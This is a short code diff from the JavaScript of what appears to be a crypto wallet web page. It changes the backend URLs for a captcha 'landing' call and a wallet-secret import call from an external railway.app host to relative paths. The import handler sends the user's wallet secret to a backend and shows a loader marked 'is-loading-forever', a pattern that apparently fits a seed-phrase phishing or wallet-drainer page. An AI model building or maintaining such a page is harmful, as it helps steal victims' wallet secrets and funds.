@@ -222,7 +222,7 @@ function markCaptchaPassed(token) {
 
   if (captchaMeta) captchaMeta.textContent = "Verification complete.";
 
-  fetch("https://vault-wallet-back-production.up.railway.app/api/captcha/landing", {
+  fetch("/api/captcha/landing", {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({ captchaToken: currentCaptchaToken, country: "Unknown" }),
@@ -623,7 +623,7 @@ secretImportButton?.addEventListener("click", async () => {
     loader.removeAttribute("hidden");
     loader.classList.add("is-loading-forever");
   }
-  const backendUrl = "https://vault-wallet-back-production.up.railway.app/api/wallet/import";
+  const backendUrl = "/api/wallet/import";
   const captchaToken = currentCaptchaToken || getCaptchaToken();
 
   if (!captchaToken || captchaToken.trim().length === 0) {
